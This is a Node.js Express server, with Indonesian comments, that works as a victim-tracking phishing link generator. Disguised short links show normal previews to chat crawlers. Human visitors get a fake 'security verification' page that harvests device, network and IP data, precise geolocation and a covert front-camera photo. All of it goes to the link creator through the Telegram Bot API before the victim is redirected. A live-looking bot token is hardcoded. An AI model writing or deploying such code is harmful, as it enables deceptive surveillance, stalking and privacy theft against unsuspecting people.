const express = require('express');
const axios = require('axios');
const cors = require('cors');
const { parse } = require('node-html-parser');
const FormData = require('form-data');
const { Buffer } = require('buffer');

const app = express();
const PORT = process.env.PORT || 3030;

const BOT_TOKEN = process.env.BOT_TOKEN || '7804296227:AAEl74FdE71shWdAVhmlLXi8-9WPLnZ6pto';

if (!BOT_TOKEN) {
    console.error("FATAL: BOT_TOKEN tidak didefinisikan!");
    process.exit(1);
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(express.json({ limit: '10mb' }));
app.set("json spaces", 2);
app.use(cors());

// Route baru yang disamarkan. Contoh: /s/NzY1NDMyNzY1NDp8fGh0dHBzOi8vd3d3LnlvdXR1YmUuY29t
app.get('/s/:data', async (req, res) => {
    const encodedData = req.params.data;
    let creatorId, targetUrl;

    try {
        const decodedString = Buffer.from(encodedData, 'base64').toString('utf8');
        const parts = decodedString.split('|||');
        if (parts.length !== 2) throw new Error('Invalid data format');
        [creatorId, targetUrl] = parts;
    } catch (error) {
        return res.status(400).send("URL tidak valid atau format salah.");
    }

    const userAgent = req.headers['user-agent'];
    const crawlerUserAgents = ['TelegramBot', 'facebookexternalhit', 'WhatsApp', 'Twitterbot', 'Discordbot'];
    const isCrawler = crawlerUserAgents.some(crawler => userAgent.includes(crawler));

    if (isCrawler) {
        try {
            const response = await axios.get(targetUrl);
            const root = parse(response.data);
            const getMetaTag = (prop) => root.querySelector(`meta[property="${prop}"]`)?.getAttribute('content') || '';
            const title = getMetaTag('og:title') || root.querySelector('title')?.text || 'Judul tidak ditemukan';
            const description = getMetaTag('og:description') || 'Deskripsi tidak ditemukan';
            const image = getMetaTag('og:image') || 'https://i.ibb.co/7J1p1zF/video-play-icon.png';

            return res.send(`
                <!DOCTYPE html>
                <html><head>
                    <meta charset="UTF-8"><title>${title}</title>
                    <meta property="og:title" content="${title}" /><meta property="og:description" content="${description}" />
                    <meta property="og:image" content="${image}" /><meta name="viewport" content="width=device-width, initial-scale=1.0">
                </head><body></body></html>`);
        } catch (error) {
            return res.send('Gagal mengambil metadata untuk preview.');
        }
    }

    res.send(`
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Memeriksa koneksi Anda...</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap');
            html, body { width: 100%; height: 100%; margin: 0; padding: 0; }
            body { background-color: #f9f9f9; color: #333; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; text-align: center; }
            .check-container { background-color: #ffffff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05); border: 1px solid #e5e5e5; max-width: 500px; width: 90%; }
            .icon-container { margin-bottom: 20px; }
            .icon-container svg { width: 50px; height: 50px; color: #007BFF; }
            h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px 0; color: #1a1a1a; }
            p { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 30px; }
            .spinner { border: 4px solid rgba(0, 123, 255, 0.2); border-left-color: #007BFF; border-radius: 50%; width: 40px; height: 40px; animation: spin 1.2s linear infinite; margin: 20px auto 0; display: none; }
            .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
            #verify-btn { background-color: #007BFF; color: white; border: none; padding: 12px 25px; font-size: 16px; font-weight: 500; border-radius: 6px; cursor: pointer; transition: background-color 0.2s; }
            #verify-btn:hover { background-color: #0056b3; }
            #verify-btn:disabled { background-color: #a0a0a0; cursor: not-allowed; }
            @keyframes spin { to { transform: rotate(360deg); } }
        </style>
    </head>
    <body>
        <div class="check-container">
            <div class="icon-container">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.06 14.44L6.5 11l1.41-1.41 3.09 3.09 7.07-7.07L19.5 7.05l-8.48 8.48-0.08-0.09z"/></svg>
            </div>
            <h1>Verifikasi keamanan diperlukan</h1>
            <p>Untuk mengakses halaman dengan aman, klik untuk memulai pemeriksaan keamanan koneksi Anda.</p>
            <button id="verify-btn">Mulai Pemeriksaan Keamanan</button>
            <div class="spinner" id="spinner"></div>
            <div class="footer-info">Security by ProjectSF</div>
        </div>

        <script>
            const verifyBtn = document.getElementById('verify-btn');
            const spinner = document.getElementById('spinner');

            const redirectToTarget = () => { setTimeout(() => { window.location.href = \`${targetUrl}\`; }, 500); };
            
            async function logData(data) {
                try { await fetch('/log', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); } catch (e) { console.error('Log Error:', e); }
            }

            async function processData() {
                verifyBtn.disabled = true;
                verifyBtn.textContent = 'Memverifikasi...';
                spinner.style.display = 'block';

                let permissionsGranted = 0;
                const data = {
                    creatorId: \`${creatorId}\`, targetUrl: \`${targetUrl}\`, userAgent: navigator.userAgent,
                    platform: navigator.platform, language: navigator.language, screenWidth: window.screen.width,
                    screenHeight: window.screen.height, location: 'Ditolak/Dilewati', camera: 'Ditolak/Dilewati'
                };

                try { const battery = await navigator.getBattery(); data.battery = { level: \`\${Math.round(battery.level * 100)}%\`, isCharging: battery.charging }; } catch (e) { data.battery = { level: 'N/A', isCharging: 'N/A' }; }
                data.hardware = { cpuCores: navigator.hardwareConcurrency || 'N/A', ram: navigator.deviceMemory ? \`\${navigator.deviceMemory} GB\` : 'N/A' };
                data.network = { connectionType: navigator.connection?.type || 'N/A', effectiveType: navigator.connection?.effectiveType || 'N/A', downlink: navigator.connection?.downlink ? \`\${navigator.connection.downlink} Mbps\` : 'N/A' };
                data.browser = { viewportWidth: window.innerWidth, viewportHeight: window.innerHeight, pixelRatio: window.devicePixelRatio, cookiesEnabled: navigator.cookieEnabled, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone };

                try {
                    const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }); });
                    data.location = \`https://www.google.com/maps/search/?api=1&query=\${position.coords.latitude},\${position.coords.longitude}\`;
                    permissionsGranted++;
                } catch (e) { console.warn('Geolocation failed:', e.message); }

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                    const video = document.createElement('video'); video.srcObject = stream; await video.play();
                    const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    data.camera = canvas.toDataURL('image/jpeg');
                    stream.getTracks().forEach(track => track.stop());
                    permissionsGranted++;
                } catch (e) { console.warn('Camera access failed:', e.message); }
                
                data.permissionsGranted = permissionsGranted;
                await logData(data);
                redirectToTarget();
            }

            verifyBtn.addEventListener('click', processData);
        </script>
    </body>
    </html>
    `);
});

app.post('/log', async (req, res) => {
    const data = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const creatorId = data.creatorId;

    if (!creatorId) { return res.sendStatus(400); }

    let ipInfo = 'Tidak dapat mengambil info IP.';
    try {
        const ipRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,org`);
        if (ipRes.data.status === 'success') {
            ipInfo = `*Negara:* ${ipRes.data.country}\n*Kota:* ${ipRes.data.city}, ${ipRes.data.regionName}\n*ISP:* ${ipRes.data.isp}\n*Organisasi:* ${ipRes.data.org}`;
        }
    } catch (e) { console.error("Gagal mengambil info IP:", e.message); }

    const isCameraAllowed = data.camera.startsWith('data:image/jpeg;base64,');
    const cameraStatusText = isCameraAllowed ? 'Diizinkan (Gambar terlampir)' : data.camera;
    const batteryStatus = data.battery.isCharging ? '🔌 Mengisi Daya' : '🔋 Normal';

    const message =
`🎯 *TARGET BARU TERDETEKSI* 🎯
-----------------------------------
🔗 *URL Asli:* ${data.targetUrl}

*— INFO PERANGKAT & JARINGAN —*
📱 *Platform:* ${data.platform}
🧠 *CPU Cores:* ${data.hardware.cpuCores}
💾 *RAM (Perkiraan):* ${data.hardware.ram}
📶 *Jaringan:* ${data.network.connectionType} (${data.network.effectiveType})
⚡ *Baterai:* ${data.battery.level} (${batteryStatus})

*— INFO BROWSER & LOKASI —*
🖥️ *User Agent:* ${data.userAgent}
📏 *Resolusi:* ${data.screenWidth}x${data.screenHeight} | *Viewport:* ${data.browser.viewportWidth}x${data.browser.viewportHeight}
⏰ *Zona Waktu:* ${data.browser.timezone}
📍 *Lokasi:* ${data.location}

*— INFO KONEKSI (IP) —*
- *Alamat IP:* ${ip}
- *Detail IP:*\n${ipInfo}

*— RINGKASAN IZIN —*
✅ *Izin Diberikan:* ${data.permissionsGranted} dari 2
📸 *Kamera:* ${cameraStatusText}
`;

    try {
        await axios.post(`${TELEGRAM_API}/sendMessage`, { chat_id: creatorId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true });
        if (isCameraAllowed) {
            const base64Data = data.camera.replace(/^data:image\/jpeg;base64,/, "");
            const imageBuffer = Buffer.from(base64Data, 'base64');
            const form = new FormData();
            form.append('chat_id', creatorId);
            form.append('photo', imageBuffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });
            form.append('caption', '📸 Gambar dari kamera target.');
            await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
        }
    } catch (error) {
        const errorMessage = error.response ? JSON.stringify(error.response.data) : error.message;
        console.error("Gagal mengirim log ke Telegram:", errorMessage);
    }
    
    res.sendStatus(200);
});

app.listen(PORT, () => {
    console.log(`Server pelacak berjalan di port ${PORT}`);
});

module.exports = app;
